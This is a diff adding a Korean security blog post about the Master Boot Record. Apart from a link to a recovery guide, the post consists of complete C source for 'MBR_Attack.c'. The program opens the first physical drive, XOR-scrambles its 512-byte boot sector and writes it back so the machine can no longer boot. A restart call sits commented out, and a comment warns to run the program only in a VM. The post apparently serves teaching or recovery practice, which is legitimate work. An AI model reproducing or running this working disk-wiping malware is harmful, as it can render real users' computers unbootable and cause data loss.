@@ -1,0 +1,76 @@
+---
+title:  "mbr"
+subtitle: "Master Boot Record"
+author: "team.GMM"
+avatar: "img/authors/favicon.ico"
+image: "img/mbr.png"
+date:   2020-11-10
+---
+
+### MBR 복구 가이드.docx 다운로드
+- [클릭](https://drive.google.com/file/d/1q-e2zcNb9uZIjoW_aDBhCFGWyRMBWnoz/view?usp=sharing)
+<br/>
+
+``````c
+/*
+MBR_Attack.c (ver. 2020/11/17)
+by 최광석
+
+*** 주의 : 반드시 VM에서만 실행해야 하며 실행 전 스냅샷을 촬영할 것 ***
+*** 짝수 단위로 실행하면 MBR이 원상복구 되니 이 점 참고할 것 ***
+
+OS가 설치된 디스크에 접근하여 MBR을 XOR 암호화하는 방식으로 변조 후 강제종료시켜 더 이상 부팅을 할 수 없게 만듦.
+
+*/
+
+#include <stdio.h>
+#include <windows.h>
+
+#define MAX_LINE 512
+
+// AttackMBR()
+// 물리 드라이브에 접근하여 MBR 변조
+// 변조는 XOR 암호화를 사용하였음
+
+int AttackMBR() {
+	HANDLE hDisk;
+	DWORD readn = 0;
+	BYTE MBR[MAX_LINE];
+
+	hDisk = CreateFile(L"\\\\.\\PhysicalDrive0",
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		0,
+		OPEN_EXISTING,
+		0,
+		0);
+
+	if (hDisk == INVALID_HANDLE_VALUE) {
+		printf("This Drive coulnd't be opened.\n");
+		CloseHandle(hDisk);
+		return 0;
+	}
+
+	ReadFile(hDisk, MBR, MAX_LINE, &readn, 0);
+
+	for (int i = 0; i < MAX_LINE; i++) {
+		MBR[i] ^= i % 0xFF;
+	}
+
+	SetFilePointer(hDisk, 0, 0, FILE_BEGIN);
+
+	WriteFile(hDisk, MBR, MAX_LINE, &readn, 0);
+
+	CloseHandle(hDisk);
+
+//	system("shutdown -r -t 0");
+
+	return 0;
+}
+
+int main() {
+	AttackMBR();
+
+	return 0;
+}
+``````
